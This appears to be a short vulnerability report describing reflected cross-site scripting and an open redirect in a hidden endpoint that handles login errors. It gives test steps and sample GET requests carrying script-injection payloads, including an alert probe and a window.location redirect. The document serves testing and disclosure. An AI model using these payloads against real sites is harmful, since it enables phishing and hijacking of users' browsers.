## Use case

The vulnerability was found in a hidden endpoint that handled authentication errors, allowing for the execution of arbitrary JavaScript code and an open redirect to another site, which could lead to phishing attacks or other malicious activities.

## Steps to test

1. Navigate to the login page of the application.
2. Intentionally input incorrect credentials to trigger an authentication error.
3. Observe the URL for any hidden endpoints that appear in the address bar.
4. Modify the URL to include a basic XSS payload, such as '<script>alert(1)</script>'.
5. Hit enter to execute the payload and confirm if an alert pops up.
6. Replace the alert payload with a redirect script, such as '<script>window.location='http://example.com'</script>'.
7. Reload the page to see if it redirects to the specified URL.

## Commands

```text
GET https://example.com/login?username=invalid&password=invalid
GET https://example.com/hidden_endpoint?param=<script>alert(1)</script>
GET https://example.com/hidden_endpoint?param=<script>window.location='http://example.com'</script>
```
